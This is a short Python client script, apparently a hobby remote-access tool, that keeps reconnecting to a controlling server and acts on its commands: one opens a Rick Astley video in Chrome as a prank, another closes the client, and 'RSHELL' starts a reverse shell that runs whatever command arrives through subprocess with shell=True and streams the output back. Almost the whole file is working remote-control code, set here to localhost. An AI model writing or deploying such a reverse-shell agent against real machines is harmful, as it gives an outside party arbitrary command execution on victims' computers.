import subprocess
import threading
import time
import webbrowser
import socket

from colorama import Fore, Style

HOST = '127.0.0.1'
PORT = 1234

URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
chrome_path = 'C:\Program Files\Google\Chrome\Application\chrome.exe'

def main():
    # rickroll()
    socketStart()


def rickroll():
    subprocess.call([chrome_path, URL])


def socketStart():
    while True:  # search for server
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((HOST, PORT))
                # listen for requests
                while True:  # while connected to server
                    data = s.recv(1024).decode('utf-8')
                    if not data:
                        break
                    elif data == 'KILL':
                        print("Connection closed by server.")
                        exit(0)
                    elif data == 'ROLL':
                        rickroll()
                    elif data == 'RSHELL':
                        print("Opening Reverse Shell...")
                        rshell(s)
                        print("Reverse Shell closed.")
                    else:
                        print("Received data: {}".format(data))
        except socket.error as e:  # if server connection fails
            print("Connection error: {}".format(e))

def rshell(s):
    while True:
        command = s.recv(1024).decode('utf-8').rstrip('\n')
        print(Fore.GREEN + "RShell remote command: {}".format(command) + Style.RESET_ALL)
        if command.lower() == 'exit':
            break
        output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        results = output.stdout.read().decode('utf-8')
        errors = output.stderr.read().decode('utf-8')
        print(Fore.BLUE + "RShell results: " + Style.RESET_ALL + "{}".format(results if results else errors))

        try:
            data_to_send = (results if results else errors).encode("utf-8")
            # Send data in chunks
            for i in range(0, len(data_to_send), 1024):
                s.sendall(data_to_send[i:i + 1024])
            print("Sent results.")
        except BrokenPipeError:
            print("Connection closed by server.")
            break




if __name__ == "__main__":
    main()